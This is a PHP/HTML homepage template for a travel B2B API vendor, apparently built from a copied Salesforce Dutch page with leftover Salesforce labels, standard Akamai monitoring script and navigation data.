<?php
$settings = session()->get('settings');
?>
<!DOCTYPE html>
<html lang="nl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Favicon-->
    <link rel="icon" type="image/png" sizes="16x16" href="<?= site_url('themes/focus2/images/favicon.png') ?>">
    <meta property="visitor" content="prospect">
    <title><?= $settings['title'] ?? '' ?></title>
    <meta property="og:image:alt" content="">
    <meta property="og:locale" content="nl_NL">
    <meta property="og:type" content="article">
    <meta property="og:url" content="https://travsifyb2b.com/">
    <meta property="og:image" content="assets2/images/salesforce-logo.jpg">
    <meta property="og:description" content="<?= $settings['seo_description'] ?? '' ?>">
    <meta property="og:title" content="Travsify B2B">
    <meta property="og:site_name" content="Travsify B2B">
    <meta property="twitter:site" content="">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://travsifyb2b.com/">
    <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
    <meta name="description" content="<?= $settings['seo_description'] ?? '' ?>">
    <link rel="canonical" href="https://travsifyb2b.com/">
    <script type="application/ld+json">
        {
            "@context": "https://schema.org",
            "@type": "WebSite",
            "name": "Salesforce",
            "url": "https://www.salesforce.com"
        }
    </script>


    <link rel="preconnect" href="//a.sfdcstatic.com">
    <link rel="preconnect" href="//www.googletagmanager.com">
    <link rel="preconnect" href="//www.google-analytics.com">
    <link rel="preconnect" href="//wp.salesforce.com">
    <link rel="preconnect" href="//service.force.com">
    <link rel="preconnect" href="//geolocation.onetrust.com">
    <link rel="preconnect" href="//cdn.krxd.net">
    <link rel="preconnect" href="//org62.my.salesforce.com">
    <link rel="preconnect" href="//dpm.demdex.net">
    <link rel="preconnect" href="//cdn.evgnet.com">
    <link rel="preconnect" href="//salesforce.us-1.evergage.com">
    <link rel="preconnect" href="//api.company-target.com">
    <link rel="preconnect" href="//fonts.googleapis.com">
    <link rel="preload" as="font" href="//a.sfdcstatic.com/shared/fonts/salesforce-sans/SalesforceSans-Regular.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="//a.sfdcstatic.com/shared/fonts/salesforce-sans/SalesforceSans-Italic.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="//a.sfdcstatic.com/shared/fonts/salesforce-sans/SalesforceSans-Bold.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="//a.sfdcstatic.com/shared/fonts/salesforce-icons/salesforce-icons.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="font" href="//a.sfdcstatic.com/shared/fonts/avant-garde/AvantGardeForSalesforceW05-Dm.woff2" type="font/woff2" crossorigin="anonymous">
    <link rel="preload" as="style" href="/c/public/exp/pbc/server/css/style.4dfe2eaf7eb5276d9774.css">
    <link rel="stylesheet" href="assets2/css/style.4dfe2eaf7eb5276d9774.css" media="screen">
    <link rel="stylesheet" href="assets2/css/header.css" media="screen">
    <script>
        window.sfdcBase = Object.assign(window.sfdcBase || {}, {
            "env": "PROD",
            "locale": "nl-nl",
            "personalizationEnabled": true,
            "ssoEnabled": true,
            "page": {
                "pagename": "SFDC:nl:homepage",
                "type": "Home Page",
                "locale": "nl",
                "segment": "non-customer:nl",
                "sitesection": "nl:homepage",
                "uiframework": "Page Builder"
            },
            "clientErrorThreshold": 10,
            "clientErrorEndpoint": "https://www.salesforce.com/c/clerr",
            "optimizely": {
                "enabled": true,
                "cdnUrl": "https://cdn.optimizely.com/assets2/js/24776530927.js"
            }
        })
    </script>
    <script type="text/javascript" src="assets2/js/top.js"></script>
    <script async="" type="text/javascript" src="assets2/js/otSDKStub.js" data-domain-script="8e783e8c-0ad0-475d-8fca-4a03afa0a02a" crossorigin=""></script>
    <script defer="" type="text/javascript" src="assets2/js/bottom.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/ot-ext.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/comp-data.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/legacy.js"></script>
    <script async="" type="text/javascript" src="assets2/js/bundle.eac8db148673d3d61ce7.js" id="pal-script" data-dataset="sf_shared_prod"></script>
    <script type="module" src="assets2/js/navs.js"></script>
    <script defer="" type="module" src="assets2/js/prod.f2188467.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/templates.9af351a3.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/nunjucks-slim.min.js"></script>
    <script defer="" type="text/javascript" src="assets2/js/scripts.bd067cfb6df2342318f0.js"></script>


    <script>
        (window.BOOMR_mq = window.BOOMR_mq || []).push(["addVar", {
            "rua.upush": "false",
            "rua.cpush": "false",
            "rua.upre": "false",
            "rua.cpre": "false",
            "rua.uprl": "false",
            "rua.cprl": "false",
            "rua.cprf": "false",
            "rua.trans": "",
            "rua.cook": "false",
            "rua.ims": "false",
            "rua.ufprl": "false",
            "rua.cfprl": "false",
            "rua.isuxp": "false",
            "rua.texp": "norulematch"
        }]);
    </script>
    <script>
        ! function(e) {
            var n = "https://s.go-mpulse.net/boomerang/";
            if ("False" == "True") e.BOOMR_config = e.BOOMR_config || {}, e.BOOMR_config.PageParams = e.BOOMR_config.PageParams || {}, e.BOOMR_config.PageParams.pci = !0, n = "https://s2.go-mpulse.net/boomerang/";
            if (window.BOOMR_API_key = "NCPYV-VGJPP-N4J93-8HN3B-8B6S3", function() {
                    function e() {
                        if (!o) {
                            var e = document.createElement("script");
                            e.id = "boomr-scr-as", e.src = window.BOOMR.url, e.async = !0, i.parentNode.appendChild(e), o = !0
                        }
                    }

                    function t(e) {
                        o = !0;
                        var n, t, a, r, d = document,
                            O = window;
                        if (window.BOOMR.snippetMethod = e ? "if" : "i", t = function(e, n) {
                                var t = d.createElement("script");
                                t.id = n || "boomr-if-as", t.src = window.BOOMR.url, BOOMR_lstart = (new Date).getTime(), e = e || d.body, e.appendChild(t)
                            }, !window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]\./)) return window.BOOMR.snippetMethod = "s", void t(i.parentNode, "boomr-async");
                        a = document.createElement("IFRAME"), a.src = "about:blank", a.title = "", a.role = "presentation", a.loading = "eager", r = (a.frameElement || a).style, r.width = 0, r.height = 0, r.border = 0, r.display = "none", i.parentNode.appendChild(a);
                        try {
                            O = a.contentWindow, d = O.document.open()
                        } catch (_) {
                            n = document.domain, a.src = "javascript:var d=document.open();d.domain='" + n + "';void(0);", O = a.contentWindow, d = O.document.open()
                        }
                        if (n) d._boomrl = function() {
                            this.domain = n, t()
                        }, d.write("<bo" + "dy onload='document._boomrl();'>");
                        else if (O._boomrl = function() {
                                t()
                            }, O.addEventListener) O.addEventListener("load", O._boomrl, !1);
                        else if (O.attachEvent) O.attachEvent("onload", O._boomrl);
                        d.close()
                    }

                    function a(e) {
                        window.BOOMR_onload = e && e.timeStamp || (new Date).getTime()
                    }
                    if (!window.BOOMR || !window.BOOMR.version && !window.BOOMR.snippetExecuted) {
                        window.BOOMR = window.BOOMR || {}, window.BOOMR.snippetStart = (new Date).getTime(), window.BOOMR.snippetExecuted = !0, window.BOOMR.snippetVersion = 12, window.BOOMR.url = n + "NCPYV-VGJPP-N4J93-8HN3B-8B6S3";
                        var i = document.currentScript || document.getElementsByTagName("script")[0],
                            o = !1,
                            r = document.createElement("link");
                        if (r.relList && "function" == typeof r.relList.supports && r.relList.supports("preload") && "as" in r) window.BOOMR.snippetMethod = "p", r.href = window.BOOMR.url, r.rel = "preload", r.as = "script", r.addEventListener("load", e), r.addEventListener("error", function() {
                            t(!0)
                        }), setTimeout(function() {
                            if (!o) t(!0)
                        }, 3e3), BOOMR_lstart = (new Date).getTime(), i.parentNode.appendChild(r);
                        else t(!1);
                        if (window.addEventListener) window.addEventListener("load", a, !1);
                        else if (window.attachEvent) window.attachEvent("onload", a)
                    }
                }(), "".length > 0)
                if (e && "performance" in e && e.performance && "function" == typeof e.performance.setResourceTimingBufferSize) e.performance.setResourceTimingBufferSize();
            ! function() {
                if (BOOMR = e.BOOMR || {}, BOOMR.plugins = BOOMR.plugins || {}, !BOOMR.plugins.AK) {
                    var n = "" == "true" ? 1 : 0,
                        t = "",
                        a = "yjlr743in27rwzkxpmia-f-32c34bbea-clientnsv4-s.akamaihd.net",
                        i = "false" == "true" ? 2 : 1,
                        o = {
                            "ak.v": "36",
                            "ak.cp": "1410510",
                            "ak.ai": parseInt("638429", 10),
                            "ak.ol": "0",
                            "ak.cr": 12,
                            "ak.ipv": 4,
                            "ak.proto": "http/1.1",
                            "ak.rid": "7860de",
                            "ak.r": 43444,
                            "ak.a2": n,
                            "ak.m": "dsca",
                            "ak.n": "essl",
                            "ak.bpcip": "194.87.31.0",
                            "ak.cport": 41746,
                            "ak.gh": "23.72.253.155",
                            "ak.quicv": "",
                            "ak.tlsv": "tls1.3",
                            "ak.0rtt": "",
                            "ak.csrc": "-",
                            "ak.acc": "bbr",
                            "ak.t": "1700231952",
                            "ak.ak": "hOBiQwZUYzCg5VSAfCLimQ==H+uhRB8ZODKYPmVZVAQ34f5BlSG41b0H5h0Xjsth/XxGjFA4cdgLCcqKXJLnsflGuyla/FD9aWbPlGAYy15wg2U9AW5+enkrF/WP6zjlg0a96E246NME0lKamoBTdkLSOfiPGPrtX/N+9QCra8pWPPuPXJwfShMctkrWPbwEBoXiEOBCeONDJekzOeFoxef1QdeolU07T2/MVq5UY4zKFCRFinxCj0zoMnluoLuUKiuWKk+d6KDp3oynNQiz8I5weEiFK78WZZQ4IB2Bs5X0dT/aCquOgk/OPGqdOuu3TErlbEc/S6q8wLIHpQXJoCV9k9wuwJJV5y8yvQanrCa7IT6wa4YoYwGjMLvXWgLmZHqZ8H0kOLi7OOMQyD8srYUG/b/+/KjyZQcqRgJ45BNWaXwTsmxNswLIpcJy0V3qFRc=",
                            "ak.pv": "436",
                            "ak.dpoabenc": "",
                            "ak.tf": i
                        };
                    if ("" !== t) o["ak.ruds"] = t;
                    var r = {
                        i: !1,
                        av: function(n) {
                            var t = "http.initiator";
                            if (n && (!n[t] || "spa_hard" === n[t])) o["ak.feo"] = void 0 !== e.aFeoApplied ? 1 : 0, BOOMR.addVar(o)
                        },
                        rv: function() {
                            var e = ["ak.bpcip", "ak.cport", "ak.cr", "ak.csrc", "ak.gh", "ak.ipv", "ak.m", "ak.n", "ak.ol", "ak.proto", "ak.quicv", "ak.tlsv", "ak.0rtt", "ak.r", "ak.acc", "ak.t", "ak.tf"];
                            BOOMR.removeVar(e)
                        }
                    };
                    BOOMR.plugins.AK = {
                        akVars: o,
                        akDNSPreFetchDomain: a,
                        init: function() {
                            if (!r.i) {
                                var e = BOOMR.subscribe;
                                e("before_beacon", r.av, null, null), e("onbeacon", r.rv, null, null), r.i = !0
                            }
                            return this
                        },
                        is_complete: function() {
                            return !0
                        }
                    }
                }
            }()
        }(window);
    </script>
</head>

<body>

    <script>
        var wpdata = {
            navigation: {
                "top-navigation-c360": [{
                        "ID": 0,
                        "title": "About",
                        "showIcon": true,
                        "navigationItems": [{
                            "ID": 1,
                            "buttonlink": {
                                "label": "About Us",
                                "url": "/site/about",
                                "target": "_self"
                            }
                        }]
                    },
                    {
                        "ID": 2,
                        "title": "Contact",
                        "showIcon": true,
                        "navigationItems": [{
                            "ID": 1,
                            "buttonlink": {
                                "label": "Contact Us",
                                "url": "/site/contact",
                                "target": "_self"
                            }
                        }]
                    },
                    {
                        "ID": 3,
                        "title": "Pricing",
                        "showIcon": true,
                        "navigationItems": [{
                            "ID": 1,
                            "buttonlink": {
                                "label": "Our Prices",
                                "url": "/site/pricing",
                                "target": "_self"
                            }
                        }]
                    },
                    {
                        "ID": 4,
                        "title": "FAQ",
                        "showIcon": true,
                        "navigationItems": [{
                            "ID": 1,
                            "buttonlink": {
                                "label": "Frequently Asked Questions",
                                "url": "/site/faq",
                                "target": "_self"
                            }
                        }]
                    },
                    {
                        "ID": 5,
                        "title": "Blog",
                        "showIcon": true,
                        "navigationItems": [{
                                "ID": 1,
                                "buttonlink": {
                                    "label": "Blog Home",
                                    "url": "/site/blog_home",
                                    "target": "_self"
                                }
                            },
                            {
                                "ID": 2,
                                "buttonlink": {
                                    "label": "Blog Post",
                                    "url": "/site/blog_post",
                                    "target": "_self"
                                }
                            }
                        ]
                    },
                    {
                        "ID": 6,
                        "title": "Documentation",
                        "showIcon": true,
                        "navigationItems": [{
                            "ID": 1,
                            "buttonlink": {
                                "label": "Our Documentation",
                                "url": "/documentation",
                                "target": "_self"
                            }
                        }]
                    }
                ],
                "utility-navigation-c360": {
                    "labelBack": "Back",
                    "logoAlt": "Travsify B2B Home",
                    "labelMore": "labelMore",
                    "contact": {
                        "title": "Contact",
                        "firstSubtitle": "Telephone",
                        "lock": {
                            "move": false,
                            "remove": false
                        },
                        "links": [{
                                "label": "Contact Page",
                                "url": "/site/contact",
                                "target": "_self"
                            },
                            {
                                "label": "api@travsifyb2b.com",
                                "url": "mailto:api@travsifyb2b.com",
                                "target": "_self"
                            },
                            {
                                "label": "Address: 635 Pine Ave, Pacific Grove, California, U.S.A",
                                "url": "/site/contact",
                                "target": "_self"
                            }
                        ],
                        "secondSubtitle": "Online",
                        "phones": [{
                                "url": "tel:2347040185146 ",
                                "label": "+2347040185146 ",
                                "target": "_self",
                                "ariaLabel": ""
                            },
                            {
                                "url": "tel:12134686786",
                                "label": "+12134686786",
                                "target": "_self",
                                "ariaLabel": ""
                            }
                        ]
                    },
                    "login": {
                        "labelLogin": "<?php if (empty(session()->get('token'))) {
                                            echo 'Login';
                                        } else {
                                            echo 'Dashboard';
                                        } ?>",
                        "labelMyAccounts": "Mijn accounts",
                        "authBackgroundImage": {
                            "src": null,
                            "alt": null,
                            "title": "",
                            "sizes": false,
                            "width": null,
                            "height": null
                        },
                        "labelProducts": "Link",
                        "loginSalesforce": {
                            "label": "<?php if (empty(session()->get('token'))) {
                                            echo 'Login';
                                        } else {
                                            echo 'Dashboard';
                                        } ?>",
                            "url": "<?php if (empty(session()->get('token'))) {
                                        echo '/login';
                                    } else {
                                        echo '/dashboard';
                                    } ?>",
                            "target": "_self",
                            "ariaLabel": "Travsify B2B label"
                        }
                    }
                },
                "isPreview": false
            }
        };
    </script>

    <div class="globalnav-wrapper-c360">
        <a class="screen-reader-text skip-to-content-c360" href="#main-content">
            <div class="screen-reader-container">Skip to content</div>
        </a>
        <hgf-c360nav locale="us" search="true" show-region-selector="true" context-nav-enabled="false" hide-login="false" truly-hide-login="false" show-button-main="true" show-button-secondary="false" hide-contact="false" origin="https://wp.sfdcdigital.com/en-us/wp-json">

        </hgf-c360nav>


    </div>
    <main id="main-content">
        <div data-blade-id="1666820637520_9ph" data-blade-position="1" data-blade-name="sf/marquee" data-blade-variant="marquee" data-blade-source="www" data-blade-type="blade">
            <section id="1666820637520_9ph" class="relative marquee--blade marquee--right-image">
                <div class="container  pb-64 mobile-pb-48   pt-64
            mobile-pt-48 ">

                    <article class="grid grid_main grid--onebyone" data-module-track-impressions="true" data-module-id="1666820637520_9ph" data-module-name="Data + AI2 + CRM + Vertrouwen = meer verkoop en hogere klanttevredenheid." data-module-position="1" data-module-type="headline">

                        <div class="image__wrapper">


                            <img style="border-radius: 40%" loading="eager" src="assets2/images/home-1.jpg" class="image__asset" alt="De Salesforce-personages Genie en Einstein, samen met een Salesforce-klant rondom het Customer 360 wiel." sizes="100vw" srcset="assets2/images/home-1.jpg 150w, assets2/images/home-1.jpg 300w, assets2/images/home-1.jpg 768w, assets2/images/home-1.jpg 1024w" height="1024" width="1024">


                        </div>

                        <div class="content__wrapper ">
                            <header class="marquee__blade-heading eyebrow--standard ">


                                <pbc-trailblazer-badge-wrapper endpoint="https://mobile.api.trailhead.com/graphql" localization="{&quot;localizedGreeting&quot;:&quot;Hallo {firstname}!&quot;,&quot;localizedWordForBadges&quot;:&quot;Badges&quot;,&quot;localizedWordForPoints&quot;:&quot;Punten&quot;}" bladelayout="right"></pbc-trailblazer-badge-wrapper>




                                <h1 class="headline marquee__headline--standard" style="">

                                    Sell Travel without the complexity with our Global B2b travel suite

                                </h1>


                                <div class="blade__description">
                                    <p>Build OTA, metasearch, flight and hotel engines with our free B2b API and custom white labels and plugins</p>
                                </div>
                            </header>
                            <div class="cta_container flex flex--right ctas__2">
                                <pbc-button class="cta_button__wrapper" data-link-text="Get B2b Api" data-link-url="/nl/form/signup/freetrial-sales-pe/?d=pb" data-link-type="primary cta">
                                    <a class="cta_button" data-size="" data-variant="primary" data-stacking="default" aria-label="Begin je gratis proefperiode: Data + AI + CRM + Vertrouwen = meer verkoop en hogere klanttevredenheid." href="/nl/form/signup/freetrial-sales-pe/?d=pb">
                                        Get B2b Api
                                    </a>
                                </pbc-button>
                                <pbc-button class="cta_button__wrapper" data-link-text="Our documentation" data-link-url="/nl/form/demo/demo-overview/?d=pb" data-link-type="secondary cta">
                                    <a class="cta_button" data-size="" data-variant="secondary" data-stacking="default" aria-label="Bekijk onze demo's en ontdek hoe Customer 360 je bedrijf kan helpen." label="Bekijk de demo" href="/nl/form/demo/demo-overview/?d=pb">
                                        Our documentation
                                    </a>
                                </pbc-button>
                            </div>
                        </div>
                    </article>
                </div>
                <div class="blade__background blade__background--custom-desktop">
                    <img loading="lazy" src="assets2/images/php-marqee-ai-data-crm-lg-bg.jpeg" class="background__image background__image--custom" alt="" sizes="100vw" srcset="assets2/images/php-marqee-ai-data-crm-lg-bg_3.jpeg 150w, assets2/images/php-marqee-ai-data-crm-lg-bg_1.jpeg 300w, assets2/images/php-marqee-ai-data-crm-lg-bg_4.jpeg 768w, assets2/images/php-marqee-ai-data-crm-lg-bg_5.jpeg 1024w, assets2/images/php-marqee-ai-data-crm-lg-bg_2.jpeg 1536w, assets2/images/php-marqee-ai-data-crm-lg-bg_6.jpeg 2048w" height="100%" width="100%">
                </div>
                <div class="blade__background blade__background--custom-mobile">

                    <img loading="lazy" src="assets2/images/php-marquee-ai-data-crm-sm-bg.jpg" class="background__image background__image--custom" alt="" sizes="100vw" srcset="assets2/images/php-marquee-ai-data-crm-sm-bg_1.jpg 150w, assets2/images/php-marquee-ai-data-crm-sm-bg_2.jpg 214w, assets2/images/php-marquee-ai-data-crm-sm-bg_3.jpg 768w, assets2/images/php-marquee-ai-data-crm-sm-bg_4.jpg 731w, assets2/images/php-marquee-ai-data-crm-sm-bg_5.jpg 1097w" height="100%" width="100%">

                </div>
            </section>
        </div>
        <div data-blade-id="1670353488900_9ao" data-blade-position="2" data-blade-name="sf/nup" data-blade-variant="nup" data-blade-source="www" data-blade-type="blade">
            <section id="1670353488900_9ao" class="relative nup--blade  layout--3 nup--card_resource">
                <div class="container  pb-64 mobile-pb-48   pt-24 mobile-pt-16 ">
                    <div class="grid grid_main  nup  nup__3
             nup__gridThree">

                        <header class="nup__blade-heading text--center">


                            <h2 class="headline" style="">

                                Start selling travels today

                            </h2>


                        </header>


                        <div class="cards">


                            <article class="card card__1 card__wrapper " data-module-id="1670353488876_2oy" data-module-name="Maak kennis met Salesforce Starter: de eenvoudige, krachtige CRM-suite." data-module-position="1" data-module-type="card_resource">
                                <div class="card--card_resource pbc-g-elevation-2 flex border-rad-16 ">
                                    <div class="card__image__wrapper">
                                        <a href="/nl/form/starter/overview-demo/?d=pb" tabindex="-1" aria-label="Maak kennis met Salesforce Starter: de eenvoudige, krachtige CRM-suite." data-link-url="/nl/form/starter/overview-demo/?d=pb" data-link-type="image" target="">

                                            <img loading="lazy" src="assets2/images/home-2.jpg" class="card__image" alt="Het Salesforce-karakter Astro loopt voor een Salesforce-productscherm, met een profielfoto van het Salesforce-karakter Einstein." sizes="100vw" srcset="assets2/images/home-2.jpg 150w, assets2/images/home-2.jpg 300w, assets2/images/home-2.jpg 768w" height="auto" width="auto">

                                        </a>
                                    </div>

                                    <div class="card__content__wrapper">
                                        <div class="card__copy__wrapper">


                                            <h3 class="card__headline mb-16" style="">
                                                <a href="/nl/form/starter/overview-demo/?d=pb" data-link-text="Free flight and hotel api" data-link-url="/nl/form/starter/overview-demo/?d=pb" data-link-type="header" target="">
                                                    Free flight and hotel api
                                                </a>
                                            </h3>


                                        </div>

                                        <div class="cta_container flex flex--center">

                                            <pbc-button class="cta_button__wrapper" data-link-text="Bekijk de demo" data-link-url="/nl/form/starter/overview-demo/?d=pb" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="wideM" aria-label="Maak kennis met Salesforce Starter: de eenvoudige, krachtige CRM-suite." href="/nl/form/starter/overview-demo/?d=pb">
                                                    Get free Api
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>


                                </div>
                            </article>


                            <article class="card card__2 card__wrapper " data-module-id="1670353488889_146i" data-module-name="Word een Salesblazer." data-module-position="2" data-module-type="card_resource">
                                <div class="card--card_resource pbc-g-elevation-2 flex border-rad-16 ">
                                    <div class="card__image__wrapper">
                                        <a href="https://travsifyb2b.com/blog/category/sales/" tabindex="-1" aria-label="Word een Salesblazer." data-link-url="https://travsifyb2b.com/blog/category/sales/" data-link-type="image" target="">

                                            <img loading="lazy" src="assets2/images/home-3.jpg" class="card__image" alt="Twee Salesblazers met hoodies poseren naast Salesforce karakter Zig." sizes="100vw" srcset="assets2/images/home-3.jpg 150w, assets2/images/home-3.jpg 300w, assets2/images/home-3.jpg 768w, assets2/images/home-3.jpg 1024w" height="auto" width="auto">

                                        </a>
                                    </div>

                                    <div class="card__content__wrapper">
                                        <div class="card__copy__wrapper">


                                            <h3 class="card__headline mb-16" style="">
                                                <a href="https://travsifyb2b.com/blog/category/sales/" data-link-text="Whitelabels and plugins" data-link-url="https://travsifyb2b.com/blog/category/sales/" data-link-type="header" target="">
                                                    Whitelabels and plugins
                                                </a>
                                            </h3>


                                        </div>

                                        <div class="cta_container flex flex--center">
                                            <pbc-button class="cta_button__wrapper" data-link-text="Get started" data-link-url="https://travsifyb2b.com/blog/category/sales/" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="wideM" aria-label="Word een Salesblazer" href="https://travsifyb2b.com/blog/category/sales/">
                                                    Get started
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>


                                </div>
                            </article>

                            <article class="card card__3 card__wrapper " data-module-id="1670353488883_n5o" data-module-name="Well crafted documentation" data-module-position="3" data-module-type="card_resource">
                                <div class="card--card_resource pbc-g-elevation-2 flex border-rad-16 ">

                                    <div class="card__image__wrapper">
                                        <a href="/nl/solutions/small-business-solutions/overview/" tabindex="-1" aria-label="Well crafted documentation" data-link-url="/nl/solutions/small-business-solutions/overview/" data-link-type="image" target="">

                                            <img loading="lazy" src="assets2/images/home-4.jpg" class="card__image" alt="Een vrouwelijke ondernemer houdt een tablet vast. Naast haar staat het Salesforce-karakter Einstein door een verrekijker te kijken." sizes="100vw" srcset="assets2/images/home-4.jpg 150w, assets2/images/home-4.jpg 300w, assets2/images/home-4.jpg 768w, assets2/images/home-4.jpg 1024w" height="auto" width="auto">

                                        </a>
                                    </div>

                                    <div class="card__content__wrapper">
                                        <div class="card__copy__wrapper">


                                            <h3 class="card__headline mb-16" style="">
                                                <a href="/nl/solutions/small-business-solutions/overview/" data-link-text="Boost de groei van kleine bedrijven met Data + AI + CRM + Vertrouwen." data-link-url="/nl/solutions/small-business-solutions/overview/" data-link-type="header" target="">
                                                    Well crafted documentation
                                                </a>
                                            </h3>


                                        </div>

                                        <div class="cta_container flex flex--center">
                                            <pbc-button class="cta_button__wrapper" data-link-text="Get to know" data-link-url="/nl/solutions/small-business-solutions/overview/" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="wideM" aria-label="Kleine bedrijven groeien sneller met data + AI + CRM + vertrouwen." href="/nl/solutions/small-business-solutions/overview/">
                                                    Get to know
                                                </a>
                                            </pbc-button>
                                        </div>

                                    </div>


                                </div>
                            </article>

                        </div>

                    </div>
                </div>


            </section>

        </div>
        <div data-blade-id="1667234829560_wyo" data-blade-position="3" data-blade-name="sf/story" data-blade-variant="story" data-blade-source="www" data-blade-type="blade">
            <section id="1667234829560_wyo" class="relative story--blade story--link_above layout--4 story--card_story">
                <div class="container  pb-64 mobile-pb-48   pt-24 mobile-pt-16 ">
                    <div class="grid grid_main  grid--onebyone  story__4
             story__gridFour">

                        <header class="story__blade-heading text--center block_align--center
                                ">


                            <h2 class="headline" style="">

                                Empowering global leading B2B and B2C Travel Providers

                            </h2>


                        </header>



                        <div class="cards align-slot--left
     cards_grid-row-2">

                            <article class="card card__1 card__wrapper" data-module-id="1667234829618_11p" data-module-name="MKB " data-module-position="1" data-module-type="card_story">
                                <div class="card--card_story flex border-rad-16">

                                    <div class="card__content__wrapper flex flex--column">
                                        <div class="card__image__wrapper">

                                            <img style="max-height: 230px !important; border: 1px solid #eedddd80; padding: .5rem" loading="lazy" src="assets2/images/home-5.jpg" class="card__image" alt="Een MKB'er" sizes="100vw" srcset="assets2/images/home-5.jpg 150w, assets2/images/home-5.jpg 300w, assets2/images/home-5.jpg 768w" height="auto" width="auto">

                                        </div>
                                        <div class="card__content__wrapper">
                                            <div class="card__copy__wrapper">


                                                <h3 class="card__headline mt-0" style="">

                                                    Online travel businesses

                                                </h3>



                                                <div class="card__description mb-0">
                                                    We power booking engines of global online travel agents to flights, hotels and ancillaries.
                                                </div>

                                            </div>
                                        </div>

                                        <div class="cta_container flex flex--center">

                                            <pbc-button class="cta_button__wrapper" data-link-text="Know more" data-link-url="/nl/form/demo/demo-small-business/?d=pb" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="default" aria-label="Bekijk demo's - MKB" href="/nl/form/demo/demo-small-business/?d=pb">
                                                    Know more
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>

                                </div>
                            </article>

                            <article class="card card__2 card__wrapper" data-module-id="1667234829625_16de" data-module-name="Sales" data-module-position="2" data-module-type="card_story">
                                <div class="card--card_story flex border-rad-16">

                                    <div class="card__content__wrapper flex flex--column">
                                        <div class="card__image__wrapper">

                                            <img loading="lazy" src="assets2/images/home-7.jpg" class="card__image" alt="Een salesprofessional met statistieken die +29% sales productiviteit laten zien" sizes="100vw" srcset="assets2/images/home-7.jpg 150w, assets2/images/home-7.jpg 295w, assets2/images/home-7.jpg 768w" height="auto" width="auto">

                                        </div>
                                        <div class="card__content__wrapper">
                                            <div class="card__copy__wrapper">


                                                <h3 class="card__headline mt-0" style="">

                                                    Travel technology Integrators

                                                </h3>



                                                <div class="card__description mb-0">
                                                    <p>Our API remain the go to integration for most travel tech integrators</p>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="cta_container flex flex--center">

                                            <pbc-button class="cta_button__wrapper" data-link-text="Bekijk demo’s" data-link-url="/nl/form/demo/demo-sales/?d=pb" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="default" aria-label="Bekijk demo's - sales" href="/nl/form/demo/demo-sales/?d=pb">
                                                    Know more
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>

                                </div>
                            </article>

                            <article class="card card__3 card__wrapper" data-module-id="1667234829629_18ht" data-module-name="Service" data-module-position="3" data-module-type="card_story">
                                <div class="card--card_story flex border-rad-16">

                                    <div class="card__content__wrapper flex flex--column">
                                        <div class="card__image__wrapper">

                                            <img style="min-height: 230px !important;    border: 1px solid #eedddd80;    padding: .5rem;" loading="lazy" src="assets2/images/home-81.jpg" class="card__image" alt="Een serviceprofessional met statistiek die -27% supportkosten laat zien" sizes="100vw" srcset="assets2/images/home-81.jpg 150w, assets2/images/home-81.jpg 300w, assets2/images/home-81.jpg 768w" height="auto" width="auto">

                                        </div>
                                        <div class="card__content__wrapper">
                                            <div class="card__copy__wrapper">


                                                <h3 class="card__headline mt-0" style="">

                                                    Wholesalers and agregators

                                                </h3>

                                                <div class="card__description mb-0">
                                                    <p>We sell to wholesalers at rate cheaper and to businesses less the fares.</p>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="cta_container flex flex--center">

                                            <pbc-button class="cta_button__wrapper" data-link-text="Bekijk demo’s" data-link-url="/nl/form/demo/demo-service/?d=pb" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="default" aria-label="Bekijk demo’s - Service Cloud" href="/nl/form/demo/demo-service/?d=pb">
                                                    Know more
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>

                                </div>
                            </article>

                            <article class="card card__4 card__wrapper" data-module-id="1667235388698_bbb" data-module-name="Bekijk alle producten." data-module-position="4" data-module-type="card_story">
                                <div class="card--card_story flex border-rad-16">

                                    <div class="card__content__wrapper flex flex--column">
                                        <div class="card__image__wrapper">

                                            <img style="min-height: 230px !important; border: 1px solid #eedddd80; padding: .5rem;" loading="lazy" src="assets2/images/home-82.jpg" class="card__image" alt="Een Salesforce Trailblazer en Astro, een Salesforce mascotte" sizes="100vw" srcset="assets2/images/home-82.jpg 150w, assets2/images/home-82.jpg 300w, assets2/images/home-82.jpg 768w" height="auto" width="auto">

                                        </div>
                                        <div class="card__content__wrapper">
                                            <div class="card__copy__wrapper">


                                                <h3 class="card__headline mt-0" style="">

                                                    Loyalty and concierge business

                                                </h3>



                                                <div class="card__description mb-0">
                                                    <p>We tell the story better with systems for loyalty and concierge businesses</p>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="cta_container flex flex--center">

                                            <pbc-button class="cta_button__wrapper" data-link-text="Know more" data-link-url="/nl/form/demo/demo-overview/?d=pb" data-link-type="primary cta">
                                                <a class="cta_button" data-size="" data-variant="cardText" data-stacking="default" aria-label="Know more - alle producten" href="/nl/form/demo/demo-overview/?d=pb">
                                                    Know more
                                                </a>
                                            </pbc-button>

                                        </div>

                                    </div>

                                </div>
                            </article>

                        </div>

                    </div>
                </div>


            </section>

        </div>
